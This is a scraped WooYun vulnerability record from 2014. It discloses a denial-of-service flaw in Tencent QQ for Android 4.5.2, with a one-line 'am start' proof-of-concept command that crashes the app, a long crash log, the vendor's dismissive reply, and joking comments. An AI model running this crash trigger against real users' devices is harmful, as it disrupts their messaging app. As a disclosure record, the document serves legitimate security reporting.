{"id": 5084, "wybug_id": "wooyun-2014-048176", "wybug_title": "Tencent Messenger(QQ) Dos vulnerability(critical)", "wybug_corp": "腾讯", "wybug_author": "Pentest.mobi", "wybug_date": "2014-01-07 15:54", "wybug_open_date": "2014-04-04 15:55", "wybug_type": "拒绝服务", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-08：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向公众公开  简要描述： Tencent Messenger(QQ) Version: 4.5.2 critical Dos vulnerability need to be handled. 详细说明：  com.tencent.mobileqq.activity.QQBrowserDelegationActivity这个activity组件可被任意第三方程序调用导致进程crash. Process Name: com.tencent.mobileqq  Version: 4.5.2问题包：http://pan.baidu.com/s/1lEFzo poc:am start -n com.tencent.mobileqq/com.tencent.mobileqq.activity.QQBrowserDelegationActivitycrash log:\nE/AndroidRuntime( 2420): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.tencent.mobileqq/com.tencent.mobileqq.activity.QQBrowserDelegationActivity}: java.lang.NullPointerException: uriStringE/AndroidRuntime( 2420):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1955)E/AndroidRuntime( 2420):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1980)E/AndroidRuntime( 2420):     at android.app.ActivityThread.access$600(ActivityThread.java:122)E/AndroidRuntime( 2420):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1146)E/AndroidRuntime( 2420):     at android.os.Handler.dispatchMessage(Handler.java:99)E/AndroidRuntime( 2420):     at android.os.Looper.loop(Looper.java:137)E/AndroidRuntime( 2420):     at android.app.ActivityThread.main(ActivityThread.java:4340)E/AndroidRuntime( 2420):     at java.lang.reflect.Method.invokeNative(Native Method)E/AndroidRuntime( 2420):     at java.lang.reflect.Method.invoke(Method.java:511)E/AndroidRuntime( 2420):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)E/AndroidRuntime( 2420):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)E/AndroidRuntime( 2420):     at dalvik.system.NativeStart.main(Native Method)E/AndroidRuntime( 2420): Caused by: java.lang.NullPointerException: uriStringE/AndroidRuntime( 2420):     at android.net.Uri$StringUri.<init>(Uri.java:464)E/AndroidRuntime( 2420):     at android.net.Uri$StringUri.<init>(Uri.java:454)E/AndroidRuntime( 2420):     at android.net.Uri.parse(Uri.java:426)E/AndroidRuntime( 2420):     at com.tencent.mtt.spcialcall.sdk.MttApi.loadUrlInMbWnd(MttApi.java:68)E/AndroidRuntime( 2420):     at com.tencent.mobileqq.activity.QQBrowserDelegationActivity.a(ProGuard:264)E/AndroidRuntime( 2420):     at com.tencent.mobileqq.activity.QQBrowserDelegationActivity.b(ProGuard:448)E/AndroidRuntime( 2420):     at com.tencent.mobileqq.activity.QQBrowserDelegationActivity.onCreate(ProGuard:99)E/AndroidRuntime( 2420):     at android.app.Activity.performCreate(Activity.java:4465)E/AndroidRuntime( 2420):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)E/AndroidRuntime( 2420):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1919)E/AndroidRuntime( 2420):     ... 11 moreW/ActivityManager(   78):   Force finishing activity com.tencent.mobileqq/.activity.QQBrowserDelegationActivityW/InputManagerService(   78): Window already focused, ignoring focus gain of: com.android.internal.view.IInputMethodClient$Stub$Proxy@41603f58W/ThrottleService(   78): unable to find stats for iface rmnet0I/WindowManager(   78): createSurface Window{414395e0  paused=false}: DRAW NOW PENDINGD/dalvikvm( 2420): GC_CONCURRENT freed 754K, 7% free 12872K/13767K, paused 4ms+17msW/ActivityManager(   78): Activity pause timeout for ActivityRecord{41b8a678 com.tencent.mobileqq/.activity.QQBrowserDelegationActivity}W/NetworkManagementSocketTagger(   78): setKernelCountSet(10035, 0) failed with errno -2D/dalvikvm( 2420): GC_CONCURRENT freed 727K, 6% free 13146K/13959K, paused 4ms+4msE/MSF.S.AppProcessManager( 2118): [E]can not find com.tencent.mobileqq to receive msg to:null from:FromServiceMsg msName:onRecvPushMsg ssoSeq:711488865 failCode:1000 errorMsg: uin:187224929 serviceCmd:OnlinePush.PbPushGroupMsg appId:-1 appSeq:711488865E/MSF.S.AppProcessManager( 2118): [E]can not find com.tencent.mobileqq to receive msg to:null from:FromServiceMsg msName:onRecvPushMsg ssoSeq:711489146 failCode:1000 errorMsg: uin:187224929 serviceCmd:OnlinePush.PbPushGroupMsg appId:-1 appSeq:711489146E/MSF.S.AppProcessManager( 2118): [E]can not find com.tencent.mobileqq to receive msg to:null from:FromServiceMsg msName:onRecvPushMsg ssoSeq:711502275 failCode:1000 errorMsg: uin:187224929 serviceCmd:OnlinePush.PbPushGroupMsg appId:-1 appSeq:711502275W/ActivityManager(   78): Activity destroy timeout for ActivityRecord{41b8a678 com.tencent.mobileqq/.activity.QQBrowserDelegationActivity}W/ActivityManager(   78): Timeout executing service: ServiceRecord{41a68a38 com.tencent.mobileqq/.app.GuardService}I/ActivityManager(   78): Crashing app skipping ANR: ProcessRecord{4145d828 2420:com.tencent.mobileqq/10035} Executing service com.tencent.mobileqq/.app.GuardService\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 Pentest.mobi@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-04-04 15:55 厂商回复： 非常感谢您的报告，新版本已不存在报告中问题，感谢对腾讯业务的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-07 16:47 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  很厉害的样子~    \n     2014-01-07 17:39 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  大牛都喜欢秀下英文啊    \n     2014-01-07 18:13 |    \t\t233 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小孩子看了根本把持不住)\t\t \n  ni zai say what？    \n     2014-01-07 18:46 |    \t\tHoerWing \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:4        | \"People should not be afraid of their go...)\t\t \n  can U not speak your fucking Englishi?    \n     2014-01-07 20:04 |    \t\tJJFly \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | <a href=\"www.yidianjiujijifly.com\">www.y...)\t\t \n  wodecet3haimeiguozenmeban,qiudaikao    \n     2014-01-08 09:21 |    \t\tsdj \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:6        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  title lve diao.    \n     2014-01-08 10:16 |    \t\tleehenwu \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:24        | 撸·啊·撸)\t\t \n  balabala    \n     2014-01-08 10:18 |    \t\t4399gdww \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | )\t\t \n  I can speak Chinese?yesfuck    \n     2014-01-08 10:34 |    \t\thqdvista \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:31        | N/A)\t\t \n  mu ce shi na ge dong    \n     2014-01-08 13:29 |    \t\t小震 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | ~)\t\t \n  wǒ dōu bú zhī dào nǐ men shuō de shí me dōng xī 。fǎn zhèng wǒ de yīng wén shì fēi cháng hǎo de ，nǐ men shuō de bú shì biāo zhǔn yīng yǔ ~    \n     2014-01-08 13:44 |    \t\t4399gdww \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | )\t\t \n  @小震 diǎo    \n     2014-01-08 22:43 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  屌丝必备，谷歌翻译    \n     2014-01-10 17:07 |    \t\tEnjoy_Hacking \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:8        | 时间无言，如此这般。)\t\t \n  diào!    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}